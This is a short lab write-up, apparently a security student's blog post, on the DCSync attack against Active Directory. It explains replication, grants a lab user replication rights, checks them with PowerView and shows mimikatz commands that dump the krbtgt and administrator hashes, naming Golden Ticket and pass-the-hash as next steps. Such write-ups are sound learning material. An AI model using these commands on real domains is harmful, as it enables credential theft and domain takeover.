## DCSync Attack: Gaining Domain Admin via Active Directory Replication

![image](https://github.com/user-attachments/assets/84e8c4a7-c52c-4a59-a6b1-e1b2abaf1c69)

### Summary
A few days after the eCPPTv3 (eLearning Certified Professional Penetration Tester) exam I started learning again to explore more deeply the types of misconfigurations in the active directory, actually I really want to write an article about GPO abuse because during the eCPPTv3 exam I didn’t have time to exploit this security misconfiguration, so well because I am also learning DCSync Attack, therefore I will try to make an article that discusses this. as usual before doing exploitation we have to learn a little about what Active Directory Replication is and what it is used for.

### Active Directory Replication
Active Directory Replication is one of the features in active directory that is useful for synchronizing between Domain Controllers, for example, in an active directory network there are 2 domains, namely Primary and Secondary in this case DC01 (bank.local) and DC02 (child.bank.local), so when WS01 who joins the child.bank.local domain makes a password change to user “kimmy.kim” then DC02 will synchronize to DC01 to make these changes and vice versa.

### DCSync Attack
A DCSync attack is an exploitation technique that abuses the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to impersonate a domain controller (DC) and request user credentials from another DC. By obtaining Active Directory replication rights, an attacker can dump credentials using Mimikatz, potentially retrieving Administrator or krbtgt hashes, which can be used for attacks such as Golden Ticket.

---
### Initial Setup

![image](https://github.com/user-attachments/assets/1c1e49b8-2dc9-48f9-b9b7-fff0198cf417)


Open the Tools navigation and select ADUC


![image](https://github.com/user-attachments/assets/e96529a7-3d7b-4cf6-83b3-37a4acfb86f0)


Open the Tools navigation and select ADUC


![image](https://github.com/user-attachments/assets/6d242e93-b43a-49f1-b63a-ffa66437446b)


Right-click on the domain and select Properties


![image](https://github.com/user-attachments/assets/1ec367f8-adc7-4447-afe4-717067753744)

Select the Security tab and click advanced


![image](https://github.com/user-attachments/assets/a53ec67a-7cca-4d48-a674-a1b2ae93afe2)

Add and select which user you want to give access to “Active Airectory Replication”.


![image](https://github.com/user-attachments/assets/275d3dba-0ded-416e-9432-80af05e6b494)

Add and select which user you want to give access to “Active Airectory Replication”.

---
### Enumeration
To do a lab setup just like that, we move on to the enumeration stage to see if there is any abuse of rights for “Active Directory Replication”.

Get our current user SID and check using PowerView whether we have DS-Replication-Get-Changes, Replicating Directory Changes All, Replicating Directory Changes In Filtered Set permissions, you can follow the commands below.


```bash
Import-Module .\PowerView.ps1
whoami /all <- Get SID Current User

<- Execute ->
Get-ObjectAcl -Identity "dc=child,dc=bank,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-3186528552-2144129351-4049443044-1104"}
```

![image](https://github.com/user-attachments/assets/d4c05236-3289-4446-8e45-11a450d41107)

You can check the ObjectAceType section.

---
### Exploitation
Okay, we have made sure that the current account, “kimmy.kim” can have the rights to “Active Directory Replication”, so we just do the dumping using mimikatz, you can follow the commands below.

```bash
.\mimikatz.exe
lsadump::dcsync /user:<target>@domain.local
```

![image](https://github.com/user-attachments/assets/0c261f81-b3a3-4c9e-8dc2-58e9b3f149a5)

It can be seen in the picture that we managed to get the hash of user krbtgt and ready to be used for Golden Ticket Attack.


![image](https://github.com/user-attachments/assets/84e8c4a7-c52c-4a59-a6b1-e1b2abaf1c69)

Or just pass the hash directly to the admin account because we can also get the NTLM hash from the administrator account.

Maybe like that for this article, if there is a wrong explanation I am very open to criticism, or you can just correct it in the comments column, thank you for reading from start to finish :)

### Reference
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync

- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/replication/active-directory-replication-concepts

- https://www.extrahop.com/resources/attacks/dcsync

